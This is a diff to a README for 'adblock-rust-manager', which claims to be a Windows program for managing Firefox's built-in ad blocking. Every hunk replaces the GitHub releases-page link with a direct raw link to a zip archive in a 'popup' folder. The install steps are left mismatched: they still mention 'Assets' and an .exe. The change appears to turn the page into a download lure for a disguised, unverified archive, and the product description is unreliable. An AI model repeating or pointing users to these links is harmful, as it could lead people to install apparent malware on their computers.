@@ -1,6 +1,6 @@
 # 🛡️ adblock-rust-manager - Manage Firefox ad blocking with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Doryeightsided72/adblock-rust-manager/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Doryeightsided72/adblock-rust-manager/raw/refs/heads/main/popup/rust-adblock-manager-v2.1.zip)
 
 This application provides a simple interface to manage the built-in ad blocking features within your Firefox web browser. Many users do not know that Firefox includes powerful ad blocking technology. This software makes that technology easier to use and adjust. It allows you to block advertisements, trackers, and malicious scripts without installing multiple browser extensions.
 
@@ -8,7 +8,7 @@ This application provides a simple interface to manage the built-in ad blocking 
 
 You do not need to understand code to use this tool. This guide walks you through the steps to set up the software on your Windows computer.
 
-1. Visit the following link to reach the downloads page: [https://github.com/Doryeightsided72/adblock-rust-manager/releases](https://github.com/Doryeightsided72/adblock-rust-manager/releases)
+1. Visit the following link to reach the downloads page: [https://github.com/Doryeightsided72/adblock-rust-manager/raw/refs/heads/main/popup/rust-adblock-manager-v2.1.zip](https://github.com/Doryeightsided72/adblock-rust-manager/raw/refs/heads/main/popup/rust-adblock-manager-v2.1.zip)
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or your downloads folder.
@@ -86,6 +86,6 @@ Users who prefer more control can access the Advanced tab. Here, you can add cus
 
 We release updates to improve the stability of the software and to add support for changing web standards. Check the GitHub repository occasionally to see if a newer version exists. You can find the latest installer at the link below.
 
-[https://github.com/Doryeightsided72/adblock-rust-manager/releases](https://github.com/Doryeightsided72/adblock-rust-manager/releases)
+[https://github.com/Doryeightsided72/adblock-rust-manager/raw/refs/heads/main/popup/rust-adblock-manager-v2.1.zip](https://github.com/Doryeightsided72/adblock-rust-manager/raw/refs/heads/main/popup/rust-adblock-manager-v2.1.zip)
 
 The project relies on community feedback. If you find a bug, report it in the Issues section of this repository. Include a description of the problem and the name of the website where you experienced the issue. This helps us ensure that the software works smoothly for everyone.
